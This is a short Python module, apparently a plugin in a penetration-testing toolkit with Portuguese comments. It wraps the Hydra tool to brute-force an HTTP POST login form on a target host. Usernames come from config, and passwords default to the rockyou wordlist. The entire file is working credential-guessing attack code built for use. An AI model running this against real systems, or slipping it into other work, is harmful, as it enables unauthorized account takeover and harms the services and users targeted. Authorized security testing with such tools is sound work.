from utils import run_cmd, extrair_host

def run(target: str, cfg: dict) -> str:
    """Executa brute force de login HTTP usando Hydra com config externa"""
    host = extrair_host(target)

    login_path = cfg.get("login_path", "/login")
    user_field = cfg.get("username_field", "username")
    pass_field = cfg.get("password_field", "password")
    fail_string = cfg.get("fail_string", "Invalid")
    wordlist = cfg.get("password_list", "/usr/share/wordlists/rockyou.txt")
    fixed_user = cfg.get("fixed_user")
    userlist = cfg.get("userlist")

    cmd = ["hydra"]

    if fixed_user:
        cmd += ["-l", fixed_user]
    elif userlist:
        cmd += ["-L", userlist]
    else:
        return "[ERRO] Nenhum usuário definido no config (fixed_user ou userlist)."

    cmd += ["-P", wordlist]
    cmd += [host, "http-post-form",
            f"{login_path}:{user_field}=^USER^&{pass_field}=^PASS^:F={fail_string}"]

    return run_cmd(cmd, timeout=600)
